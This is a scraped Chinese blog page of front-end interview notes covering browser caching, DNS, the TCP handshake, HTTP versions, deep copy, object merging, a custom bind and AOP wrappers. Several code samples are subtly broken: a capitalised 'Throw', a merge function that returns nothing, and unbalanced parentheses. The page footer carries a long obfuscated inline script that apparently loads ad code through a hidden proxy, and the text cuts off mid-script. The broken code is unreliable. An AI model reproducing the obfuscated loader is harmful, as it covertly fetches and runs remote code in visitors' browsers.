 <p>缓存分为：强缓存／协商缓存。<br> 缓存位置：内存缓存、硬盘缓存。<br> 检测步骤：先检测是否有强缓存，没有或失效就检测是否有协商缓存，没有就去获取最新数据<br> html页面一般不做缓存，js、css及其他资源会</p> 
</blockquote> 
<ul><li>强缓存：<code>Cache-Control:max-age=</code>表示多长时间后再次请求新数据HTTP1.1，<code>Expires</code>指定过期时间HTTP1.0，优先级低于前者</li></ul> 
<p>打开新网页：（此时直接检查硬盘缓存，没有则发送请求新数据）<br> F5刷新：先查内存再查硬盘，都没有就请求数据<br> Ctr+F5：不使用缓存，请求头会加字段：<code>Cache-control:no-cache</code>，直接请求最新数据</p> 
<p>问题：如果页面更新，之前请求设置了强缓存还能获取最新数据吗？<br> 答案：可以，页面更新后webpack打包的资源名称hash值被改变，浏览器发现新资源未做缓存，所以会重新请求。还有一种方法，如果不使用webpack，则将引入的资源加后缀也可以，后缀名不同也不走缓存。<code>&lt;script src='xxx.js?12345'&gt;&lt;/script&gt;</code></p> 
<ul><li>协商缓存<br> Last-Modified (HTTP1.0) / ETag (HTTP1.1)<br> 协商缓存就是强缓存失效后，浏览器携带缓存标志向服务器请求，服务器根据缓存标志决定是否使用缓存的过程</li></ul> 
<p>处理过程：<br> 携带缓存标志：<code>If-Modified-Since=Last-Modified 值</code> <code>If-None-Match=ETag 值</code><br> 服务器没更新：304状态，浏览器直接读缓存<br> 服务器更新了：200状态及最新资源以及Last-Modified / ETag，将结果和缓存标志写入本地</p> 
<blockquote> 
 <p>Last-Modified 资源文件最后更新时间，秒<br> ETag 记录的是一个标识，更新资源文件会生成新的ETag</p> 
</blockquote> 
<ul><li>LocalStorage数据缓存<br> 一般使用该对象存储数据缓存，缓存格式建议：<code>time:xxx, data:[]</code><br> 请求时先检测本地缓存对象中是否存在该数据且未过期，否则就直接请求新的</li></ul> 
<h3>
<a id="3_DNS_332"></a>3. DNS解析</h3> 
<p>域名解析，也是带缓存的<br> 先是走本地hosts文件<br> 没有则走本地DNS解析缓存<br> 没有则走本地DNS服务<br> 没有则走远程域名解析服务器</p> 
<blockquote> 
 <p>递归查询、迭代查询</p> 
</blockquote> 
<p>递归<br> <img src="https://images2.imgbox.com/71/2f/Gr3CCoFW_o.png" alt="在这里插入图片描述"><br> DNS优化：1 减少DNS请求次数（一个页面资源都放到相同的服务器上） 2 预获取prefech<br> 第一种不推荐：实际往往会将不同资源放到不同服务器上，有利于提高资源服务器的性能利用，同时HTTP同源一次大概4-7个请求，资源分布后有利于实现高并发<br> 注意：必须要使用Link标签！<br> <img src="https://images2.imgbox.com/51/1f/GotPANQd_o.png" alt="在这里插入图片描述"></p> 
<h3>
<a id="4_TCP_347"></a>4. 建立连接通道TCP三次握手</h3> 
<p>三次握手：<br> client：SYN=1 seq=x<br> server：SYN=1 ACK=1 seq=y ack=x+1<br> client：ACK=1 seq=x+1 ack=y+1<br> <img src="https://images2.imgbox.com/e8/2e/g9gXYC9p_o.png" alt="在这里插入图片描述"></p> 
<p>四次挥手：<br> client：FIN=1 seq=u<br> server：ACK=1 seq=v ack=u+1<br> 服务器继续与客户端传递数据<br> server：FIN=1 ACK=1 seq=w ack=u+1<br> client：ACK=1 seq=u+1 ack=w+1</p> 
<h2>
<a id="HTTP101120_362"></a>HTTP1.0、1.1、2.0区别</h2> 
<p>HTTP/1.0 每次请求建立一个TCP连接，用完即关闭，长连接默认关闭<br> HTTP/1.1 默认开启【长连接keep-alive】：若干请求会串行化处理，前一个请求超时会导致后面所有请求阻塞，新增断点续传（返回码206），新增支持host头域，如果没有会报400（通过host处理一台服务器上有多个共享IP地址的虚拟服务器，1.0默认一个IP对应一个服务器）<br> HTTP/2.0 新增【多路复用】：多个请求在同一个连接上并行执行，某个请求耗时严重不会影响其他请求</p> 
<blockquote> 
 <p>HTTP2.0相比于1.x新增特性<br> <strong>新的二进制格式binary format</strong>：1.x基于文本解析，需要考虑的场景很多，二进制不同，健壮性高<br> <strong>header压缩</strong>：1.x的header带有大量信息，每次都重复发送，2.0中使用encoder减少header大小，通讯双方各自缓存一份header fields表，避免重复传输，减少大小<br> <strong>服务端推送</strong>：可以在HTTP响应头中设置Link命令来让浏览器接收服务器的推送，无需多次请求（页面有个css请求，客户端收到css时，服务端会将js等文件也推送过来，客户端请求时从缓存中读取）<br> <code>Link: &lt;/styless.css&gt;; rel=preload; as=style, &lt;example.png&gt;; rel=preload; as=image</code></p> 
</blockquote> 
<h1>
<a id="5__373"></a>5 对象深拷贝</h1> 
<p>浅拷贝：拷贝后生成的对象不同，对象中的值指向原来的数据（只拷贝了一级）<br> 深拷贝：拷贝后生成的对象和对象中的值都是新的</p> 
<h2>
<a id="_377"></a>浅拷贝</h2> 
<p>数组浅拷贝方法：</p> 
<ul>
<li>
<code>...</code>展开运算符：<code>let a = [...b]</code>
</li>
<li>
<code>concat</code>运算：<code>let a = b.concat([])</code>
</li>
<li>
<code>slice</code>运算：<code>let a = b.slice()</code>
</li>
</ul> 
<p>对象浅拷贝：</p> 
<ul>
<li>
<code>...</code>展开运算符：<code>let a ={...b}</code>
</li>
<li>
<code>Object.assign</code>运算：<code>let a = Object.assign({},b)</code>
</li>
<li>写循环赋值，<code>Object.keys(obj)</code>无法获取<code>Symbol</code>类型的属性， 因为该属性不可枚举，所以需要再加上<code>Object.getOwnPropertySymbols(obj)</code>获取所有obj上的属性</li>
</ul> 
<blockquote> 
 <p>获取对象的Symbol属性名称：Object.getOwnPropertySymbols(obj)</p> 
</blockquote> 
<h2>
<a id="_390"></a>深拷贝</h2> 
<p>实现原理：每次浅克隆一级，如果有下一级继续浅克隆下一级，实现所有深克隆<br> 但是深拷贝中有个问题：循环引用：<code>let a={};a.a=a</code>，此时循环拷贝会出现栈溢出问题，解决方法是使用缓存，即判断当前需要拷贝的对象是否之前拷贝过，如果拷贝过则直接从缓存中取，否则就创建一个新的</p> 
<pre><code class="prism language-js">
<span class="token comment">/**
 * 深克隆（深拷贝）+ 解决深拷贝函数中循环引用时导致的栈溢出的问题
 * @param {object} origin 
 * @param {*} hashMap WeakMap数据，用于缓存克隆过的对象
 * @returns origin / 克隆的origin
 */</span>
<span class="token keyword">function</span> <span class="token function">deepCloneCycle</span><span class="token punctuation">(</span>origin<span class="token punctuation">,</span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WeakMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
  <span class="token keyword">let</span> result <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>hashMap<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span>origin<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> hashMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>origin<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 查缓存字典中是否已有需要克隆的对象，有的话直接返回同一个对象（同一个引用，不用递归无限创建进而导致栈溢出了）</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> origin <span class="token operator">===</span> <span class="token string">'object'</span> <span class="token operator">&amp;&amp;</span> origin <span class="token operator">!==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span> <span class="token comment">// 【类型判断】引用类型，进行递归拷贝（用typeof判断类型要剔除null的情况）</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>origin<span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">'[object Array]'</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
      <span class="token comment">// 【类型判断】数组类型，创建一个新数组</span>
      result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
      hashMap<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>origin<span class="token punctuation">,</span> result<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 哈希表缓存新值</span>
      <span class="token comment">// 【遍历赋值】</span>
      origin<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token parameter">el</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{<!-- --></span>
        result<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token function">deepCloneCycle</span><span class="token punctuation">(</span>el<span class="token punctuation">,</span> hashMap<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 【递归】</span>
      <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
      <span class="token comment">// 【类型判断】对象类型，创建一个新对象</span>
      result <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token punctuation">}</span><span class="token punctuation">;</span>
      hashMap<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>origin<span class="token punctuation">,</span> result<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 哈希表缓存新值</span>
      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> key <span class="token keyword">in</span> origin<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token comment">// 【遍历赋值】对象这里特殊处理了，不遍历拷贝原型链上的属性</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>origin<span class="token punctuation">.</span><span class="token function">hasOwnProperty</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
          result<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">deepCloneCycle</span><span class="token punctuation">(</span>origin<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">,</span> hashMap<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 【递归】</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span> <span class="token comment">// 【类型判断】原始类型直接返回</span>
    <span class="token keyword">return</span> origin<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>当然对于对象上存在Symbol属性的还需要在遍历key的时候把<code>Object.getOwnPropertySymbols(obj)</code>也算上去</p> 
<h1>
<a id="6_merge_432"></a>6 对象merge合并</h1> 
<p>两个对象合并在业务中非常有用，一般替合并规则为：一个原对象A，一个新对象B，将B合并到A上，对于其中的某个属性：</p> 
<pre><code>1. A和B该属性为基本数据类型，B直接覆盖A的该属性
2. A该属性为对象，而B为基本数据类型，报错！
3. A是基本数据类型，B为对象，直接覆盖
4. A和B该属性都是对象，递归合并
5. 特殊的，对于属性是数组的，合并中看作基本数据类型！！
</code></pre> 
<p>示例程序：</p> 
<pre><code class="prism language-js"><span class="token comment">// 定义一个函数用于判断如惨是否为对象</span>
<span class="token keyword">function</span> <span class="token function">isObj</span><span class="token punctuation">(</span><span class="token parameter">obj</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> obj <span class="token operator">===</span> <span class="token string">"object"</span> <span class="token operator">&amp;&amp;</span> obj <span class="token keyword">instanceof</span> <span class="token class-name">Object</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token punctuation">(</span>obj <span class="token keyword">instanceof</span> <span class="token class-name">Array</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">// merge函数，将后者合并到前者</span>
<span class="token keyword">function</span> <span class="token function">mergeObj</span><span class="token punctuation">(</span><span class="token parameter">objo<span class="token punctuation">,</span>objn</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
	<span class="token keyword">let</span> isObjo <span class="token operator">=</span> <span class="token function">isObj</span><span class="token punctuation">(</span>objo<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">let</span> isObjn <span class="token operator">=</span> <span class="token function">isObj</span><span class="token punctuation">(</span>objn<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span>isObjo <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>isObjn<span class="token punctuation">)</span> Throw <span class="token keyword">new</span> <span class="token class-name">TypeError</span><span class="token punctuation">(</span><span class="token string">"merge function param must be object!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>isObjo <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>isObjn<span class="token punctuation">)</span> <span class="token keyword">return</span> objn
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>isObjo <span class="token operator">&amp;&amp;</span> isObjn<span class="token punctuation">)</span> <span class="token keyword">return</span> objn
	Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>objn<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token parameter">key</span><span class="token operator">=&gt;</span><span class="token punctuation">{<!-- --></span>
		objo<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">mergeObj</span><span class="token punctuation">(</span>objo<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">,</span>objn<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span>
	<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre> 
<h1>
<a id="7_bindcurrying_460"></a>7 函数柯里化（bind&amp;currying）</h1> 
<p>简单理解即：调用一个函数返回一个新函数<br> 思想：利用闭包，将目标函数需要处理的一些参数预先处理，并返回该函数<br> 借助工具：<code>bind/call/apply</code><br> 自己实现一个bind：</p> 
<pre><code class="prism language-js"><span class="token keyword">function</span> <span class="token function">bind</span><span class="token punctuation">(</span><span class="token parameter">func<span class="token punctuation">,</span>context<span class="token punctuation">,</span><span class="token operator">...</span>args</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
	<span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token function">proxy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
		<span class="token keyword">return</span> <span class="token function">func</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span><span class="token operator">...</span>args<span class="token punctuation">)</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>对于IE8及以下的浏览器，由于不支持bind，需要自己定一个放在function原型上<br> 示例函数：</p> 
<pre><code class="prism language-js"><span class="token operator">~</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">proto</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
	<span class="token keyword">function</span> <span class="token function">bind</span><span class="token punctuation">(</span><span class="token parameter">context<span class="token punctuation">,</span><span class="token operator">...</span>args</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
		<span class="token keyword">let</span> that <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
			<span class="token keyword">return</span> <span class="token function">that</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span><span class="token operator">...</span>args<span class="token punctuation">)</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
	proto<span class="token punctuation">.</span>bind <span class="token operator">=</span> bind<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token class-name">Function</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span>
</code></pre> 
<h1>
<a id="8_AOP_486"></a>8 AOP切面编程</h1> 
<p>POP：面向过程<br> OOP：面相对象<br> AOP：面相切面</p> 
<p>示例代码：</p> 
<pre><code class="prism language-js"><span class="token comment">// 需要实现的功能</span>
<span class="token keyword">function</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token parameter">a</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'f'</span><span class="token punctuation">)</span><span class="token punctuation">}</span>
f <span class="token operator">=</span> f<span class="token punctuation">.</span><span class="token function">before</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{<!-- --></span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'before'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">after</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{<!-- --></span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'after'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token function">f</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token comment">// before f after</span>

<span class="token comment">// 实现</span>
<span class="token comment">// 分析：</span>
<span class="token comment">// 1. 需要在函数上调用方法，所以方法必须写在函数原型上</span>
<span class="token comment">// 2. 调用后返回的是一个函数，该函数可以接受参数</span>
<span class="token class-name">Function</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">before</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">callback</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> callback <span class="token operator">!==</span> <span class="token string">"function"</span><span class="token punctuation">)</span> <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">TypeError</span><span class="token punctuation">(</span><span class="token string">"callback类型错误"</span><span class="token punctuation">)</span>
	<span class="token keyword">let</span> that <span class="token operator">=</span> <span class="token keyword">this</span>
	<span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter"><span class="token operator">...</span>params</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
		<span class="token function">callback</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span><span class="token operator">...</span>params<span class="token punctuation">)</span>
		<span class="token keyword">return</span> <span class="token function">that</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span><span class="token operator">...</span>params<span class="token punctuation">)</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token class-name">Function</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">after</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">callback</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> callback <span class="token operator">!==</span> <span class="token string">"function"</span><span class="token punctuation">)</span> <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">TypeError</span><span class="token punctuation">(</span><span class="token string">"callback类型错误"</span><span class="token punctuation">)</span>
	<span class="token keyword">let</span> that <span class="token operator">=</span> <span class="token keyword">this</span>
	<span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter"><span class="token operator">...</span>params</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
		<span class="token keyword">let</span> res <span class="token operator">=</span> <span class="token function">that</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span><span class="token operator">...</span>params<span class="token punctuation">)</span>
		<span class="token function">callback</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span><span class="token operator">...</span>params<span class="token punctuation">)</span>
		<span class="token keyword">return</span> res
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> 
<h1>
<a id="9__520"></a>9 设计模式</h1> 
<h2>
<a id="singleton_521"></a>单例设计模式singleton</h2> 
<p>单独的实例，来管理模块中内容，使模块之间独立划分</p>
                </div>
                
                

		</div>
	</article>
</main>




			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程小白.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://www.w3counter.com/tracker.js?id=150625"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0